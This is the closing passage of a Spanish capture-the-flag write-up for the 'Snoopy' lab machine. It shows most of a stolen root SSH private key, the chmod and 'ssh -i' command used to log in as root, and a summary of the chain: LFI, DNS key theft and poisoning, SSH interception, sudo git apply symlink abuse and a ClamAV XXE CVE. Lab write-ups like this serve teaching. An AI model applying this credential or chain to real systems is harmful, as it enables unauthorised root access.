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
-----END OPENSSH PRIVATE KEY-----
```

Lo guardaremos en **snoopy-root**, se le dará permiso de usuario `chmod 600 snoopy-root`

```
ssh -i snoopy-root root@10.129.229.5
```

<p align="center">
<img src="images/root.txt.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

La máquina **Snoopy** ilustra de forma clara cómo la concatenación de fallos menores en cadena (_exploit chain_) puede llevar al compromiso total de un sistema: la falta de sanitización inicial en una función web (LFI) permitió exfiltrar claves de configuración del DNS BIND9, lo que habilitó el envenenamiento de registros para interceptar tráfico sensible y enumerar usuarios. Posteriormente, el movimiento lateral se logró mediante la intercepción de credenciales por SSH (MITM) y el abuso de privilegios en el comando `sudo git apply` usando _symlinks_, demostrando cómo los permisos mal configurados en herramientas de desarrollo abren puertas críticas. Finalmente, la escalada a `root` mediante una vulnerabilidad XXE en un binario desactualizado de ClamAV (CVE-2023-20052) refuerza la necesidad imperiosa de aplicar el principio de menor privilegio, proteger las credenciales y mantener todo el software de terceros estrictamente actualizado.
